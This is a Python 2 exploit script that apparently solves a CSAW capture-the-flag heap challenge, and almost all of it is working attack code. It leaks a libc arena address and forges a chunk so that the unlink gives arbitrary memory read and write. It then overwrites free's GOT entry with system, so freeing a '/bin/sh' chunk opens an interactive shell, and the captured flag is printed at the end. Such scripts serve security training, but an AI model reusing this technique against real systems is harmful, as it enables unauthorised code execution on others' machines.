import socket, struct, os, binascii, base64
import telnetlib   

def readline(sc, show = True):
    res = ""
    while len(res) == 0 or res[-1] != "\n":
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    if show:
        print repr(res[:-1])
    return res[:-1]

def read_until(sc, s):
    res = ""
    while not res.endswith(s):
        data = sc.recv(1)
        if len(data) == 0:
            print repr(res)
            raise Exception("Server disconnected")
        res += data
        
    return res[:-(len(s))]
    
def read_all(sc, n):
    data = ""
    while len(data) < n:
        block = sc.recv(n - len(data))
        if len(block) == 0:
            print repr(data)
            raise Exception("Server disconnected")
        data += block

    return data

def I(n):
    return struct.pack("<I", n)
    
def Q(n):
    return struct.pack("<Q", n)

def make_zealot(sc, size, s):
    print "Adding zealot"
    read_until(sc, "[5]GO HOME")
    sc.send("1 ")
    read_until(sc, "[*]SPECIFY THE SIZE OF ZEALOT")
    sc.send(str(size) + " ")
    read_until(sc, "[*]GIVE SOME SKILLS TO ZEALOT")
    sc.send(s)

def destroy_zealot(sc, index):
    read_until(sc, "[5]GO HOME")
    sc.send("2 ")
    read_until(sc, "[*]WHICH ONE DO YOU WANT TO DESTROY?")
    sc.send(str(index) + " ")

def fix_zealot(sc, index, size, s):
    read_until(sc, "[5]GO HOME")
    sc.send("3 ")
    read_until(sc, "[*]WHCIH ONE DO YOU WANT TO FIX ?")
    sc.send(str(index) + " ")
    read_until(sc, "[*]SPECIFY THE SIZE OF ZEALOT")
    sc.send(str(size) + " ")
    read_until(sc, "[*]GIVE SOME SKILLS TO ZEALOT")
    sc.send(s)

def view_zealot(sc, index):
    read_until(sc, "[5]GO HOME")
    sc.send("4 ")
    read_until(sc, "[*]WHICH ONE DO YOU WANT TO SEE?")
    sc.send(str(index) + " ")
    read_until(sc, "[*]SHOWING....\n")
    res = sc.recv(8)
    return res

def read_memory(sc, addr):
    fix_zealot(sc, 3, 8, Q(addr))
    return view_zealot(sc, 0)
    
def write_memory(sc, addr, data):
    fix_zealot(sc, 3, 8, Q(addr))
    return fix_zealot(sc, 0, len(data), data)
    

sc = socket.create_connection(("pwn.chal.csaw.io", 7713))
arena_offset = 0x3c4b78
system_offset = 0x45390

# sc = socket.create_connection(("10.0.0.97", 12345))
# arena_offset = 0x3a5678
# system_offset = 0x41490

make_zealot(sc, 0x80, "X") # 0
make_zealot(sc, 0x80, "X") # 1
make_zealot(sc, 0x80, "/bin/sh") # 2
make_zealot(sc, 0x80, "X") # 3
make_zealot(sc, 0x80, "X") # 4

destroy_zealot(sc, 1)
res = view_zealot(sc, 1)
arena_addr = struct.unpack("<Q", res)[0]
print hex(arena_addr)

fixstr = Q(0) + Q(8) + Q(0x605328-8*3) + Q(0x605328-8*2) + "X" * 0x60 + Q(0x80) + Q(0x90)
fix_zealot(sc, 3, len(fixstr), fixstr)
destroy_zealot(sc, 4)

# 0x605310:       0x0000000001d5b010      0x0000000001d5b0a0
# 0x605320:       0x0000000001d5b130      0x0000000000605310
# 0x605330:       0x0000000001d5b250      0x0000000000000000

libc_base = arena_addr - arena_offset
got_free = 0x605060 

print repr(read_memory(sc, libc_base))

libc_system = libc_base + system_offset

write_memory(sc, got_free, Q(libc_system))
destroy_zealot(sc, 2)

t = telnetlib.Telnet()                                                  
t.sock = sc
t.interact()  

while True:
    data = sc.recv(16384)
    if len(data) == 0:
        break
    for line in data.split("\n"):
        print repr(line)
    
    
# flag{W4rr10rs!_A1ur_4wa1ts_y0u!_M4rch_f0rth_and_t4k3_1t!}